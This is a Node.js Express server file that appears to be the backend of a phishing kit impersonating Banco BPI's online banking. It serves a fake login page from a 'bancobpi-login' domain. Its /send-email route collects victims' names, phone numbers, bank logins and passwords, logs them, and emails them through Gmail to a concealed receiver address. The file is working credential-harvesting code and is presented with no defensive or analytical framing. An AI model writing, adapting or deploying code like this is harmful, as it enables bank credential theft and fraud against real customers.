require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middlewares
app.use(cors({
  origin: ['http://localhost:3000', 'https://bancobpi-login.onrender.com'], // Ajuste para os domínios do seu frontend
}));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Caminho para a pasta 'public'
const publicPath = path.join(__dirname, 'public');

// Serve arquivos estáticos e a página inicial
if (fs.existsSync(publicPath)) {
  app.get('/', (req, res) => {
    const indexPath = path.join(publicPath, 'loginormal.html');
    if (fs.existsSync(indexPath)) {
      res.sendFile(indexPath);
    } else {
      res.status(404).send('Arquivo loginormal.html não encontrado na pasta public.');
    }
  });
} else {
  app.get('/', (req, res) => {
    res.send('API do servidor está online. Pasta public não encontrada.');
  });
}

// Rota de envio de email
app.post('/send-email', async (req, res) => {
  console.log('Requisição recebida em /send-email:', req.body);
  const { name, phone, login, password } = req.body;

  // Validação dos campos
  if (!name || !phone || !login || !password) {
    console.log('Campos obrigatórios ausentes:', { name, phone, login, password });
    return res.status(400).json({ message: 'Todos os campos (nome, telefone, login, senha) são obrigatórios.' });
  }

  // Verifica variáveis de ambiente
  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS || !process.env.RECEIVER_EMAIL) {
    console.error('Variáveis de ambiente ausentes:', {
      EMAIL_USER: !!process.env.EMAIL_USER,
      EMAIL_PASS: !!process.env.EMAIL_PASS,
      RECEIVER_EMAIL: !!process.env.RECEIVER_EMAIL,
    });
    return res.status(500).json({ message: 'Configuração de e-mail incompleta no servidor.' });
  }

  // Configuração do Nodemailer
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
    pool: true,
    maxConnections: 1,
    socketTimeout: 30000, // 30 segundos
  });

  const mailOptions = {
    from: `"BPI Formulário" <${process.env.EMAIL_USER}>`,
    to: process.env.RECEIVER_EMAIL,
    subject: 'Nova submissão do formulário BPI Net',
    html: `
      <h3>Dados Recebidos</h3>
      <p><strong>Nome:</strong> ${name}</p>
      <p><strong>Telefone:</strong> ${phone}</p>
      <p><strong>Login:</strong> ${login}</p>
      <p><strong>Senha:</strong> ${password}</p>
    `,
  };

  try {
    console.log('Enviando e-mail para:', process.env.RECEIVER_EMAIL);
    await transporter.sendMail(mailOptions);
    console.log('E-mail enviado com sucesso');
    res.status(200).json({ message: 'E-mail enviado com sucesso' });
  } catch (error) {
    console.error('Erro ao enviar e-mail:', error.message);
    res.status(500).json({ message: 'Erro ao enviar e-mail', error: error.message });
  }
});

// Inicializa o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
  console.log('Variáveis de ambiente:', {
    EMAIL_USER: !!process.env.EMAIL_USER,
    EMAIL_PASS: !!process.env.EMAIL_PASS,
    RECEIVER_EMAIL: !!process.env.RECEIVER_EMAIL,
  });
});